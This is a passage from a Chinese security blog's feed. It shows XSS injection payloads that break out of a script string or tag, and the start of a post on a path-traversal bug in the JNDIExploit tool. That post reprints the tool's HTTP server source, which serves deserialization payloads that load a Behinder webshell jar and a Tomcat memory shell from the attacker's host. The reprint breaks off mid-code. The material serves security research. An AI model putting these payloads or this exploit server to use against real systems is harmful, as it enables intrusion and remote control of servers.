class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">name</span> = <span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_GET</span>[&#x27;name&#x27;]) ?&gt;&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">alert</span>(name);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>这样可能就没法进行注入js了，但是如果没有htmlspecialchars过滤的话，就可以用闭合<code>&quot;</code>或者闭合<code>&lt;script&gt;</code>标签进行注入,在注入其他标签<br>例如<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">&quot;;alert(1);&quot;</span></span><br><span class="line">name=&lt;/script&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;聊一下基础的xss，等着huli大佬写奇淫技巧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10314883&quot;&gt;https://ithelp.ithome.com.tw/articles/10314883&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>IELTS learning by chatgpt</title>
    <link href="http://example.com/2023/09/17/IELTS-learning-by-chatgpt/"/>
    <id>http://example.com/2023/09/17/IELTS-learning-by-chatgpt/</id>
    <published>2023-09-17T08:59:37.000Z</published>
    <updated>2023-09-17T08:59:37.285Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>JNDIExploit路径穿越漏洞</title>
    <link href="http://example.com/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2023/09/16/JNDIExploit%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-09-16T07:34:23.000Z</published>
    <updated>2023-09-16T08:10:39.221Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h2><span id="more"></span><p>该工具启动命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 0.0.0.0</span><br></pre></td></tr></table></figure><br>默认会启动http服务器<br>该工具http服务器相应的代码位于项目<br><code>src/main/java/com/feihong/ldap/HTTPServer.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.feihong.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.file.FileReader;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.CommandTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.DnslogTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.ReverseShellTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Cache;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Config;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.reflect.FieldUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cwd</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(Config.httpPort), <span class="number">0</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[+] New HTTP Request From &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot;  &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> httpExchange.getRequestURI().getPath();</span><br><span class="line">                    <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.class&quot;</span>))&#123;</span><br><span class="line">                        handleClassRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.wsdl&quot;</span>))&#123;</span><br><span class="line">                        handleWSDLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.jar&quot;</span>))&#123;</span><br><span class="line">                        handleJarRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;/xxelog&quot;</span>))&#123;</span><br><span class="line">                        handleXXELogRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.sql&quot;</span>))&#123;</span><br><span class="line">                        handleSQLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (path.endsWith(<span class="string">&quot;.groovy&quot;</span>))&#123;</span><br><span class="line">                        handlerGroovyRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                        handleXMLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">                        handleTXTRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.yml&quot;</span>))&#123;</span><br><span class="line">                        handleYmlRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        handleFileRequest(httpExchange);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] HTTP Server Start Listening on &quot;</span> + Config.httpPort + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleYmlRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">YamlName</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://&quot;</span>+ Config.ip +<span class="string">&quot;:&quot;</span>+ Config.httpPort + <span class="string">&quot;/behinder3.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  dataSourceName: \&quot;ldap://127.0.0.1:1389/basic/TomcatMemShell3\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  autoCommit: true&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (YamlName.equalsIgnoreCase(<span class="string">&quot;snake&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"><span class="comment">//            exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);</span></span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            exchange.getResponseBody().write(yaml.getBytes(&quot;UTF-8&quot;));</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + YamlName + <span class="string">&quot;.yml&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleTXTRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">txtname</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (txtname.equalsIgnoreCase(<span class="string">&quot;isok&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="string">&quot;success!&quot;</span>.getBytes();</span><br><span class="line">            exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + txtname + <span class="string">&quot;.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span 